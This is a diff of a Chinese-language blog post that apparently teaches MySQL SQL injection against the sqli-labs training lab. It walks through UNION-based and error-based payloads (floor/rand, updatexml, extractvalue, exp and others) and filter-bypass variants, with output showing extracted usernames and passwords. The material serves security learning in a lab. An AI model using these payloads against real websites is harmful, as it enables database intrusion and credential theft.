@@ -64,7 +64,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">189字</span>
+            <span class="post-count">2.4k字</span>
         </span>
     </span>
 
@@ -73,7 +73,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1分钟</span>
+            <span class="post-count">10分钟</span>
         </span>
     </span>
 </div>
@@ -84,6 +84,8 @@
 
     
     
+    <div class="tocbot"></div>
+
 
 
 
@@ -99,19 +101,111 @@
 
       
       <p>知其然，更要知其所以然！ </p>
-<p><strong>information_schema</strong></p>
-<p>是用于存储数据库元数据的表，它保存了数据库名，表名，列名等信息，让我们从爆破表名到了可以直接查询</p>
+<h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><strong>information_schema</strong></h2><p>是用于存储数据库元数据的表，它保存了数据库名，表名，列名等信息，让我们从爆破表名到了可以直接查询</p>
 <p>我们经常用到的几个表</p>
 <ol>
 <li><strong>SCHEMATA表</strong> ： 提供了当前mysql实例中所有数据库的信息。</li>
 <li><strong>TABLES 表 ：</strong> 提供了关于数据库中的表的信息。</li>
 <li><strong>COLUMNS 表 ：</strong>提供了表中的列信息</li>
 </ol>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from information_schema.schemata;</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | latin1                     | latin1_swedish_ci      | NULL     |</span><br><span class="line">| def          | mysqltest          | latin1                     | latin1_swedish_ci      | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<p>SCHEMATA: </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from information_schema.schemata;</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | test               | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
 
-<p>SCHEMATA:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from information_schema.schemata;</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | test               | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">4 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>
+<p>TABLES:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select table_name from information_schema.tables where table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">&#x2F;&#x2F;注意这里不用引号就要把数据库名转为16进制</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>
 
+<p>COLUMNS：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select column_name from information_schema.columns where table_name&#x3D;&#39;admin&#39; and table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>
+
+<p>user 表保存的用户密码 和host等等信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [mysql]&gt; select user,password from user;</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| user | password                                  |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a><strong>符号</strong></h2><h3 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a><strong>注释符号</strong></h3><p>MySQL中拥有多种注释符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line">&#x2F;**&#x2F;  &#x2F;*&#x2F;**&#x2F;这样是等效于&#x2F;**&#x2F;</span><br><span class="line">-- + 用这个符号注意是--空格任意字符很多人搞混了</span><br><span class="line">;%00</span><br><span class="line">&#96;</span><br><span class="line">&#x2F;*!*&#x2F; 内列注释为什么放在这里呢，因为它也可以当作一个空格 &#x2F;*!&#x2F;*!*&#x2F;是等效于&#x2F;*!*&#x2F;的</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作符与逻辑操作符"><a href="#操作符与逻辑操作符" class="headerlink" title="操作符与逻辑操作符"></a><strong>操作符与逻辑操作符</strong></h3><p>排列在同一行的操作符具有相同的优先级</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">:&#x3D;</span><br><span class="line"></span><br><span class="line">||, OR, XOR</span><br><span class="line"></span><br><span class="line">&amp;&amp;, AND</span><br><span class="line"></span><br><span class="line">NOT</span><br><span class="line"></span><br><span class="line">BETWEEN, CASE, WHEN, THEN, ELSE</span><br><span class="line"></span><br><span class="line">&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN</span><br><span class="line"></span><br><span class="line">|</span><br><span class="line"></span><br><span class="line">&amp;</span><br><span class="line"></span><br><span class="line">&lt;&lt;, &gt;&gt;</span><br><span class="line"></span><br><span class="line">-, +</span><br><span class="line"></span><br><span class="line">*, &#x2F;, DIV, %, MOD</span><br><span class="line"></span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">- (一元减号), ~ (一元比特反转)</span><br><span class="line"></span><br><span class="line">!</span><br><span class="line"></span><br><span class="line">BINARY, COLLATE</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入产生的原因"><a href="#注入产生的原因" class="headerlink" title="注入产生的原因"></a><strong>注入产生的原因</strong></h2><ol>
+<li><strong>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。</strong></li>
+<li><strong>过滤不严格。</strong></li>
+<li><strong>数据库配置不当。</strong></li>
+<li><strong>转义不当。</strong></li>
+</ol>
+<p>如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的fuzz上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入， 但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。</p>
+<ol>
+<li>当网站为成熟的cms框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</li>
+<li>判断为自己开发的系统，目标不是很重要可以尝试使用AWVS 等工具。</li>
+<li>信息收集的重要性，可能它的源码就在GitHub上，或者一个备份文件。</li>
+</ol>
+<hr>
+<h2 id="数据库信息收集"><a href="#数据库信息收集" class="headerlink" title="数据库信息收集"></a><strong>数据库信息收集</strong></h2><p>识别数据库版本有助于我们进一步对数据库进行注入我们可以用到 <code>version()</code> <code>@@version</code> <code>/*!版本号*/</code></p>
+<p><code>/*!*/</code> 意为在xxx版本之上执行 我的版本是5.6所以可以执行</p>
+<p>路径的话一般用<code>@@datadir</code>就可以了然后大概反猜下网站路径 操作系统 <code>@@version_compile_os</code></p>
+<p><code>system_user()</code> //系统用户名 <code>user()</code> // 用户名 <code>current_user()</code> //当前用户名 <code>session_user()</code> //链接数据库的用户名</p>
+<p>读取host与user</p>
+<p>通过以上信息还能大概判断下是不是站库分离之类的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select version(),@@version,user();</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| id                | username          | password       |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| 1                 | admin             | admin          |</span><br><span class="line">| 10.3.20-MariaDB-1 | 10.3.20-MariaDB-1 | root@localhost |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select 1,host,user from mysql.user;</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">| id   | username  | password |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">|    1 | admin     | admin    |</span><br><span class="line">|    1 | localhost | root     |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入实战"><a href="#注入实战" class="headerlink" title="注入实战"></a><strong>注入实战</strong></h2><h3 id="Sqli-Less-1"><a href="#Sqli-Less-1" class="headerlink" title="Sqli/Less-1"></a><strong>Sqli/Less-1</strong></h3><p>简单检测下，是字符型注入，推测语句为  <strong>select x,x from xxx where x=’id’ limit 0,1</strong></p>
+<p>同时#被过滤，但 –+ 可以</p>
+<p>order by 猜测 列数  —-爆出为3列</p>
+<p>limit 2，1 表示 从第3条开始取，取1条，即3</p>
+<p>limit 3，4 表示从第4条开始取，取4条，即4-7</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
+
+<p>可以爆出所有表–emails,referers,uagents,users</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-2&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; -- +</span><br></pre></td></tr></table></figure>
+
+<p>可以爆出user表下的所有列—id,username,password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-2&#39; union select 1,group_concat(id,username,password),3 from users -- +</span><br></pre></td></tr></table></figure>
+
+<p>爆字段—</p>
+<p>1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity</p>
+<p>总结：group_concat()可以聚合起来，查看更方便</p>
+<p>如果 group_concat()被过滤，可以用它的替代函数——</p>
+<p>当我们使用 <code>information_schema.schemata</code> 时被拦截了,我们可以这样绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#96;information_schema&#96;.&#96;schemata &#96;  </span><br><span class="line">information_schema&#x2F;**&#x2F;.schemata</span><br><span class="line">information_schema&#x2F;*!*&#x2F;.schemata</span><br><span class="line">information_schema%0a.schemata</span><br></pre></td></tr></table></figure>
+
+<p>users表被拦截，可以用以下方法绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security.users 数据库名 加表名</span><br><span class="line">security.&#96;users&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-floor"><a href="#1-floor" class="headerlink" title="1.floor()"></a><strong>1.floor()</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and(select 1 from </span><br><span class="line"> (</span><br><span class="line">     select </span><br><span class="line">     count(*),</span><br><span class="line">     concat(user(),floor(rand(0)*2))  x </span><br><span class="line">     from </span><br><span class="line">     information_schema.tables </span><br><span class="line">     group by </span><br><span class="line">     x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</span><br></pre></td></tr></table></figure>
+
+<p>Q1.floor()函数是什么？</p>
+<p>A1.floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。</p>
+<p>Q2.rand(0)是什么意思？</p>
+<p>A2.rand()函数可以用来生成0或1，但是rand(0)和rand()还是有本质区别的，rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数成成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成</p>
+<p>这也是我们采用rand(0)进行报错注入的原因，rand(0)是稳定的，这样每次注入都会报错，而rand()则需要碰运气了</p>
+<p>Q3.为什么会出现报错？</p>
+<p>A3.我们看一下报错的内容：Duplicate entry ‘root@localhost1’ for key ‘group_key’</p>
+<p>意思是说group_key条目重复。我们使用group by进行分组查询的时候，数据库会生成一张虚拟表</p>
+<p>在这张虚拟表中，group  by后面的字段作为主键，所以这张表中主键是name，这样我们就基本弄清报错的原因了，其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，</p>
+<p>第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；</p>
+<p>第二次是假设group  by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
+<h3 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a><strong>2.extractvalue()</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost~&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">3.updatexml()</span><br><span class="line">select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+
+<p>每个一个报错语句都有它的原理 比如 <code>exp()</code> 报错的原理 ,手册说到exp是一个数学函数 取e的x次方，当我们输入的值大于709就会报错 然后~取反它的值总会大于709所以报错。</p>
+<p>简单的用报错语句来注入一下把这里我就利用函数 <code>updatexml()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value); </span><br><span class="line">XML_document: 是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">XPath_string : Xpath</span><br><span class="line">new_value :String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>
+
+<p>其中关键点就是<code>XPath_string</code> 这块了 因为我们传入的的不是<code>XPath_string</code></p>
+<p>为什么要使用<code>concat</code> 这个函数呢，因为它是个连接函数你不用的话<code>(updatexml(1,(select user()),1))</code> 这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到<code>concat</code>用特殊字符给他连接起来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">爆库：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆表：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆字段：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name&#x3D;0x7573657273 limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆数据：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +</span><br></pre></td></tr></table></figure>
+
+<p>在报错里面直接使用 MySQL最基本的查表就可以了,你也可以把concat放在外面 </p>
+<p><code>updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)</code></p>
+<p>自己灵活多变，这里我值得注意的是它加了连接字符md5只能爆出31位,你可以用分割函数分割出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">substr(string string,num start,num length);</span><br><span class="line"></span><br><span class="line">string为字符串</span><br><span class="line"></span><br><span class="line">start为起始位置</span><br><span class="line"></span><br><span class="line">length为长度</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +</span><br></pre></td></tr></table></figure>
+
+<hr>
 
       
       <!-- reward -->
